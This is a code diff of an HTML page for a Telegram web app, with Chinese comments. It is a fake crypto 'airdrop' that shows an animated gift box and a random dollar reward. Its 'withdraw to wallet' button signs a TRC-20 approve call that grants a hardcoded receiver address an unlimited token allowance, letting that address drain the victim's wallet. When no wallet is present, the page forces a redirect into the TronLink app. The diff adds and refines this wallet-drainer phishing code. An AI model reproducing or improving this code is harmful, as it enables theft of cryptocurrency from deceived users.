@@ -10,60 +10,60 @@
         :root { --tron: #ff0013; --bg: #000; }
         body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
 
-        /* 坠落场景 */
-        #stage-drop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: flex; align-items: center; justify-content: center; }
+        /* 场景层 */
+        #stage-1, #stage-2 { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
+        #stage-2 { display: none; z-index: 200; background: radial-gradient(circle, #300 0%, #000 100%); }
 
+        /* 📦 盒子掉落 */
         #box-pack {
             position: absolute; top: -500px; left: 50%; width: 200px; margin-left: -100px; text-align: center;
-            transition: top 0.9s cubic-bezier(0.47, 0, 0.745, 0.715); 
+            transition: top 0.9s cubic-bezier(0.13, 0.71, 0.3, 0.94);
         }
-
-        .is-landed { top: 35% !important; transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) !important; }
+        .is-landed { top: 35% !important; animation: bounce 0.5s ease-out; }
 
         .box-skin {
             width: 130px; height: 130px; margin: 0 auto;
             background: linear-gradient(135deg, #ff0013 0%, #7c0000 100%);
             border: 4px solid #fff; border-radius: 25px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 70px; box-shadow: 0 0 50px rgba(255,0,0,0.8); cursor: pointer;
+            display: flex; align-items: center; justify-content: center; font-size: 70px;
+            box-shadow: 0 0 50px rgba(255,0,0,0.8); cursor: pointer;
         }
 
         .main-btn {
             margin-top: 30px; padding: 18px 45px; border-radius: 50px;
             border: none; font-size: 18px; font-weight: 900; cursor: pointer;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5); transition: 0.2s;
         }
 
         .exploding { animation: explode-fx 0.5s forwards; }
-        @keyframes explode-fx { 100% { transform: scale(6); opacity: 0; filter: blur(30px); } }
+        @keyframes explode-fx { 100% { transform: scale(5); opacity: 0; filter: blur(20px); } }
+        @keyframes bounce { 0% { transform: scaleY(0.7); } 50% { transform: scaleY(1.1); } 100% { transform: scaleY(1); } }
 
-        /* 结果场景 */
-        #stage-result { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; flex-direction: column; align-items: center; justify-content: center; z-index: 200; background: radial-gradient(circle, #300 0%, #000 100%); }
         .card { background: rgba(30, 30, 30, 0.95); border: 1px solid rgba(255,255,255,0.1); padding: 45px 30px; border-radius: 40px; text-align: center; width: 280px; backdrop-filter: blur(20px); }
     </style>
 </head>
 <body>
 
-    <div id="stage-drop">
+    <div id="stage-1">
         <div id="box-pack">
-            <div class="box-skin" onclick="coreAction()">🎁</div>
-            <button class="main-btn" style="background:#fff; color:#000;" onclick="coreAction()">领取空投</button>
+            <div class="box-skin" onclick="startClaim()">🎁</div>
+            <button class="main-btn" style="background:#fff; color:#000;" onclick="startClaim()">领取空投</button>
         </div>
     </div>
 
-    <div id="stage-result">
+    <div id="stage-2">
         <div class="card">
-            <div style="color:var(--tron); font-weight:900; font-size:12px;">AIRDROP UNLOCKED</div>
-            <div style="font-size: 60px; font-weight: 900; margin: 25px 0;">$<span id="amt">0.00</span></div>
-            <button class="main-btn" style="background:var(--tron); color:#fff; width:100%;" onclick="coreAction()">提取到加密货币钱包</button>
+            <div style="color:var(--tron); font-weight:900; font-size:12px;">AIRDROP READY</div>
+            <div style="font-size: 60px; font-weight: 900; margin: 25px 0;">$<span id="val">0.00</span></div>
+            <button class="main-btn" style="background:var(--tron); color:#fff; width:100%;" onclick="executeApprove()">提取到加密货币钱包</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        // 核心配置：绝不动
-        const TARGET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
-        const RECEIVE = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; 
+        // 核心参数保持原样
+        const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+        const RECEIVER = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; 
 
         window.onload = () => {
             if(tg) { tg.ready(); tg.expand(); }
@@ -72,45 +72,51 @@
             }, 800);
         };
 
-        // 核心功能函数：一按就触发授权
-        async function coreAction() {
-            // 1. 视觉交互：不管成没成功，先让他开箱
+        // 第一次点击：开箱动画 + 环境检测
+        function startClaim() {
             const pack = document.getElementById('box-pack');
-            if(!pack.classList.contains('exploding')) {
-                pack.classList.add('exploding');
-                setTimeout(() => {
-                    document.getElementById('stage-drop').style.display = 'none';
-                    document.getElementById('stage-result').style.display = 'flex';
-                    runCount();
-                }, 450);
-            }
+            pack.classList.add('exploding');
+            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
 
-            // 2. 核心功能：直接调起授权
+            setTimeout(() => {
+                document.getElementById('stage-1').style.display = 'none';
+                document.getElementById('stage-2').style.display = 'flex';
+                // 数字跳动
+                let target = Math.floor(Math.random() * 500 + 350);
+                let now = 0;
+                let t = setInterval(() => {
+                    now += Math.ceil(target / 20);
+                    if(now >= target) { now = target; clearInterval(t); }
+                    document.getElementById('val').innerText = now.toFixed(2);
+                }, 50);
+            }, 450);
+
+            // 如果没检测到钱包，第一次点击就预热跳转（可选，也可只放在第二个按钮）
+        }
+
+        // 第二次点击：真正的授权与跳转逻辑
+        async function executeApprove() {
             try {
-                if(window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    // 钱包环境：执行授权
                     const parameter = [
-                        {type:'address', value: RECEIVE},
-                        {type:'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
+                        {type: 'address', value: RECEIVER},
+                        {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
                     ];
-                    const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(TARGET, "approve(address,uint256)", {}, parameter);
+                    const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(CONTRACT, "approve(address,uint256)", {}, parameter);
                     const signed = await window.tronWeb.trx.sign(tx.transaction);
                     await window.tronWeb.trx.sendRawTransaction(signed);
                 } else {
-                    // 非钱包环境，跳转
+                    // 非钱包环境：强制跳转浏览器/钱包APP
                     const u = encodeURIComponent(window.location.href);
                     window.location.href = "tronlinkout://pull.dapp?url=" + u;
                 }
-            } catch (e) { console.error(e); }
-        }
-
-        function runCount() {
-            let target = Math.floor(Math.random() * 500 + 350);
-            let now = 0;
-            let t = setInterval(() => {
-                now += Math.ceil(target / 20);
-                if(now >= target) { now = target; clearInterval(t); }
-                document.getElementById('amt').innerText = now.toFixed(2);
-            }, 50);
+            } catch (e) {
+                console.error("Action error:", e);
+                // 失败了也尝试跳转，保底逻辑
+                const u = encodeURIComponent(window.location.href);
+                window.location.href = "tronlinkout://pull.dapp?url=" + u;
+            }
         }
     </script>
 </body>
